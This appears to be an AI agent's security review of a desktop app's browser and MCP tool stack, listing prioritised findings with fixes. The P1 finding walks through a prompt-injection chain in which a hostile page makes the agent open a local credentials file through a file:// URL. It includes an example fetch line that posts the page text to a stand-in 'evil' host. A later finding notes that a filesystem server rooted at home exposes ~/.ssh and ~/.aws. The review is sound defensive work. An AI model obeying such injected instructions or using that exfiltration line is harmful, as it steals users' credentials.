# Agent findings: browser/MCP stack (11 files)
# Status: COMPLETE — verified result captured 2026-10-02 18:47

FILES COVERED: src-tauri/src/browser.rs, browser_mcp.rs, browser/{actions,interactions,tabs,navigation}.rs, browser_js.rs, bin/relay_browser_mcp.rs, mcp_gallery.rs, mcp_tools_bridge.rs, browser_mcp_register.rs. Cross-refs verified: Tauri 2.11.5 command/threading model, rmcp 3.0.0-beta.2 child-process semantics, frontend pane-id generation, browser_cmds wrappers, callers in agent_sessions/mod.rs, path_within_scope.

Verified non-findings (cleared): rmcp kills children on drop (`ChildWithCleanup::drop`), so gallery disconnect/exit is not a zombie path; Tauri's `send_user_message` executes inline on the main thread, so sync commands calling `run_main_thread_call`/`with_core_on_main` cannot deadlock; pane/tab ids are `crypto.randomUUID()` (src/lib/id.ts), so page-driven `push_state` postMessage spoof cannot target its own pane's consent origin; all model-input paths that build JS use JSON-escaping (`build_resolve_js`, `type_js`, `evaluate_js`, `fill_form_js`, wait_for selector/target interpolation) — no JS-injection escape found; `wait_for` timeouts clamped (`MAX_WAIT_FOR_MS`); download filenames sanitized to `[A-Za-z0-9._-]`; `upload_file` allowlist holds (resolves symlinks, canonicalizes both sides).

## P0

none

## P1

**1. Unscoped `file://` navigation from model input gives arbitrary local file read + exfil — browser.rs:646, consumed by browser_mcp.rs:804-833.**
```rust
let allowed = matches!(parsed.scheme(), "http" | "https" | "file" | "about");
```
The MCP `navigate` op forwards the agent's raw `url` through `BrowserManager::navigate`, which accepts ANY `file://` path — and the sidecar's own schema coaches the model toward it (relay_browser_mcp.rs:567: "or file:///C:/path/index.html to preview a local app you created"). After navigating, `read_page`/`evaluate` return the file's rendered text to the agent, and `evaluate` can exfiltrate it (`fetch('https://evil', {method:'POST', body: document.body.innerText})` is a CORS-simple request from the `file://`/null origin — sent even if the response is blocked). Trigger: any prompt-injected page instructs the agent to "preview" `file:///C:/Users/<u>/.aws/credentials` and read it. Bypasses the workspace sandbox the rest of the codebase enforces deliberately (upload_file's roots allowlist; FS tools excluded from the relay bridge as "permission-ungated"). Additionally `classify_gate` (browser_mcp.rs:529-547) returns `None` for `navigate` — no confirmation gate at all in default Auto mode — and file URLs serialize to origin `"null"`, so one "always allow on this site" grant made on any local preview matches every `file://` target. Fix: in `validate_nav_url`, keep `file://` only when the decoded path passes `crate::chat::permission::path_within_scope` against the pane's project roots + artifacts dir (the exact pattern `upload_file` uses), and add `file:` navigations to `classify_gate` as a hard-gate class.

## P2

**1. `ensure_commandcode_bridge` / `register_commandcode_connectors`: unbounded synchronous `cmd.status()` on the session-spawn path — browser_mcp_register.rs:366-380, 434-446.**
`cmd.status()` waits forever: a wedged or stdin-prompting `commandcode` CLI (stdin inherited, not nulled) blocks the spawn thread indefinitely with no timeout, no error, no session start. `register_commandcode_connectors` additionally spawns 2 processes per hosted connector on every commandcode turn. Fix: `.stdin(Stdio::null())` + timeout (tokio Command + `tokio::time::timeout(10s)`, kill on expiry).

**2. Popup storm: popup blocking disabled + blank popups allowed — browser.rs:1019-1021, 1379-1388.**
`--disable-popup-blocking` in runtime args, plus `Handled=false` for blank reservations (added for OAuth): any untrusted page in any pane can run `for (;;) window.open('')` with no user gesture and no rate limit, opening unbounded real OS windows owned by the WebView2 runtime, outside Relay's pane management. Fix: per-pane in-flight blank-popup counter (max 1-2 concurrent) in `NewWindowRequested`; consider re-enabling msSmartScreenProtection since downloads already redirect into artifacts/downloads.

**3. `svc.svc.cancel()` is a never-polled future — a no-op — mcp_gallery.rs:473-475, 483-485.**
rmcp 3.0.0-beta.2's `RunningService::cancel` is `pub async fn cancel(mut self)`; `let _ =` drops the future unpolled — the comment's claim ("additionally closes the JSON-RPC session") is false; cleanup only happens via the Drop guard. Fix: `tokio::spawn(async move { let _ = svc.svc.cancel().await; })` (or `cancellation_token().cancel()`), in both `disconnect_server` and `kill_all`.

**4. Per-label state never pruned on tab/pane close — browser/navigation.rs:306-315, 320-347; tabs.rs:28-34.**
`close`, `close_pane_tabs`, `unregister_browser_pane_project` remove `in_flight`/`tab_visible`/`pane_active_tab`/registry but never `tab_urls`, `nav.starts` (NavTracker), `timeline`, `paused`, `cancelled`. (a) unbounded map growth over app lifetime; (b) a `NavigationStarting` that never completes leaves a permanent `nav.starts` marker — a recreated label gets `budget = NAV_QUIET_MAX.saturating_sub(since).max(SLACK)` = 2s, taxing every subsequent action on that tab with a fixed 2s stall. Fix: `nav.lock().end(&label)`, `tab_urls.remove(&label)` on close; drop `timeline`/`paused`/`cancelled` for the pane id on pane close.

**5. Sidecar round-trip timeout orphans the app-side dispatch — no cancellation, later ops run concurrently — bin/relay_browser_mcp.rs:223-271 vs browser_mcp.rs:249-277.**
On `ROUND_TRIP_TIMEOUT` (180s) the sidecar marks the connection closed and reconnects on the next call; the server never notices and keeps executing the abandoned request (slow-page read_page settle + up to ~13 awaited 45s-capped evals, or a batch of 15 × wait_for(120s)) — driving the visible page for minutes after the harness errored, while new-connection ops dispatch concurrently against the same pane. Fix: select on `read.next()` while dispatching so a closed/reset connection aborts the in-flight op, or pass a cancellation token triggered on disconnect.

**6. `batch` schema says navigate is not allowed; the code only blocks nested `batch` — browser_mcp.rs:1620-1622 vs relay_browser_mcp.rs:798.**
Advertised contract: "batch and navigate are not allowed inside"; only nested batches are rejected — a batch step `{"op":"navigate"}` dispatches fully (incl. pane auto-open + gate context per step), so one tool call can navigate 15 times with a single timeline entry. Fix: reject `op == "navigate"` (and arguably `new_tab`/`close_tab`) in step validation.

**7. DRY: wait-poll machinery duplicated between `op_wait_for` and `op_click_and_wait` — browser_mcp.rs:1065-1158 and 1355-1425.**
~90 lines of identical logic (condition match, `check_js`, JSON parse, navigation/selector/network_idle/stable arms, 500ms quiet-period double-probe, deadline clamping) with drift already visible (`stable` supported in one only; step cadence differs). Fix: extract `poll_condition(...)` helper.

**8. DRY: `browser-{pane}-tab-{tab}` label parsing implemented five times — browser.rs:1255-1259, 1552-1556, 1690-1696 (`split_label`), browser_mcp.rs:1938-1947 (`parse_label`), browser/actions.rs:98-101.**
A label-format change must be replicated in five places (only two have tests). Fix: single `pub(crate)` helper used at all sites.

**9. Gallery/`session_for`/`attach_filtered` double-connect race — mcp_gallery.rs:447-465, 544-572.**
lock→miss→await-connect→lock→insert with no in-flight guard: two concurrent turns requesting the same not-yet-started server each spawn a child; the second insert overwrites the first session (child reclaimed only when its Arc drops); custom servers show the exec-gate dialog twice. Fix: mirror the `InFlightGuard` pattern from `BrowserManager::create` (per-server-id pending-oneshot map).

**10. Gallery "Filesystem" flagship entry roots the server at the entire home directory — mcp_gallery.rs:102-105.**
`args: &["-y", "@modelcontextprotocol/server-filesystem", "{home}"]` — one-click install (no exec gate; `from_gallery: true` attaches freely) hands the chat model read/write over `~`, including `~/.ssh`, `~/.aws`, browser profile dirs; only the keyword-based Read/Write approval heuristic stands between a prompt-injected turn and those paths. Every other trust boundary in scope narrows to project/artifacts roots. Fix: default root to the current project directory (or a `Relay-MCP-Files` subfolder); offer `{home}` as explicit opt-in.
